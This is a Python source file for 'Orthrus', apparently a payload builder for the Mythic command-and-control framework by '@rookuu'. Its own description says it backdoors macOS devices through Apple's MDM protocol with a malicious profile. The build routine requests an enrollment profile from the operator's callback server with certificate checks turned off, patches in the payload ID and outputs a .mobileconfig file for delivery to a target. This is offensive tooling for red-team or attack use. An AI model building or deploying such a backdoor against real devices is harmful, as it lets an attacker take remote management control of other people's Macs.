from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio
import os
from distutils.dir_util import copy_tree
import tempfile

# rookuu's imports
from collections import defaultdict
import requests


class Orthrus(PayloadType):
    name = "orthrus"  # name that would show up in the UI
    file_extension = "mobileconfig"  # default file extension to use when creating payloads
    author = "@rookuu"  # author of the payload type
    supported_os = [SupportedOS.MacOS]  # supported OS and architecture combos
    wrapper = False  # does this payload type act as a wrapper for another payloads inside of it?
    wrapped_payloads = []  # if so, which payload types
    note = """This payload uses Apple's MDM protocol to backdoor a device with a malicious profile."""
    supports_dynamic_loading = False  # setting this to True allows users to only select a subset of commands when generating a payload
    build_parameters = [
        #  these are all the build parameters that will be presented to the user when creating your payload
        # we'll leave this blank for now
    ]
    #  the names of the c2 profiles that your agent supports
    c2_profiles = ["mdm"]
    # after your class has been instantiated by the mythic_service in this docker container and all required build parameters have values
    # then this function is called to actually build the payload

    mythic_encrypts = True
    translation_container = None 

    agent_path = pathlib.Path(".") / "orthrus"
    agent_icon_path = agent_path / "agent_functions" / "orthrus.svg"
    agent_code_path = agent_path / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Configuring Callback", step_description="Embedding Callback infomation into orthrus"),
        BuildStep(step_name="MDM Enroll", step_description="Enroll a template system to the MicroMDM"),
        BuildStep(step_name="Patch Configuration", step_description="Stamping in configuration values")
    ]


    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        # create the payload
        build_msg = ""
        
        try:
            if len(self.c2info) != 1:
                resp.build_stderr = "Error building payload - orthrus only supports one c2 profile at a time."
                resp.set_status(BuildStatus.Error)
                return resp

            profile = self.c2info[0]
            callback_host = profile.get_parameters_dict()['callback_host']
            callback_port = profile.get_parameters_dict()['callback_port']

            if callback_port == 443:
                callback = callback_host
            else:
                callback = "{}:{}".format(callback_host, callback_port)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuring Callback",
                StepStdout="Configuring Callback for Orthrus",
                StepSuccess=True
            ))
        
            r = requests.get("{}/mdm/enroll".format(callback), verify=False)

            if r.status_code != 200:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="MDM Enroll",
                    StepStdout="Failed to Enroll",
                    StepSuccess=False
                ))
                raise Exception(r.status_code)
            else:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="MDM Enroll",
                    StepStdout="Successfully Enrolled",
                    StepSuccess=True
                ))

            payload = r.text.replace("<string></string>", "<string>{}</string>".format(self.uuid))
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Patch Configuration",
                StepStdout="Successfully Patched!",
                StepSuccess=True
            ))

            resp.payload = payload.encode()
            if build_msg != "":
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)
            else:
                resp.build_message = "Successfully built!\n"
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp